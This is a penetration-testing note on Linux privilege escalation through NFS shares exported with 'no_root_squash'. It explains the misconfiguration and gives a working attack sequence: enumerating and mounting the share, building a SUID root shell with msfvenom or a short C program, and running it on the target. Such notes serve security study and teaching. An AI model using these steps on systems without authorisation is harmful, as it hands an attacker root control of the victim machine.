# Network File Sharing (NFS)
***

Network File Sharing (NFS) is a protocol used for sharing files and directories across a network. Its configuration file is typically created during NFS server installation and is commonly found at the path /etc/exports. A key factor in understanding a potential privilege escalation vector with NFS is the "no_root_squash" option.

When an NFS server is configured with "no_root_squash," it means that NFS won't alter the permissions of files associated with the root user. Normally, NFS changes the root user's privileges to that of the "nfsnobody" user, stripping files of their root privileges. However, if "no_root_squash" is enabled on a writable share, it allows the creation of executables with the SUID (Set User ID) bit set, which can then be executed on the target system.

## Example
In the provided image, it's evident that the "/tmp" directory is configured with the "no_root_squash" flag. This flag indicates that the NFS share of this directory retains the ownership of files and folders by the root user.

![atl text](https://raw.githubusercontent.com/masjadaan/Knowledgebase/main/Penetration_Testing/Exploitation/Linux/Privilege_Escalation/54e5801b4ff244269fca7e8f8215ee0c.png)

### Attacker Machine
```sh
sudo su

# Enumerate mountable shares
showmount -e <targetIP>

# mount the share with no_root_squash to attacker machine
mkdir /tmp/nfs
mount -o rw,vers=2 <targetIP>:/tmp /tmp/nfs

# Msfvenom
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

# Set SUID and make it executable
chmod +xs /tmp/nfs/shell.elf
```

### Target Machine
```sh
# execute the shell.elf
/tmp/shell.elf
```


#### Notes:
- instead of using msfvenom, you can create shell.c
```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}
```
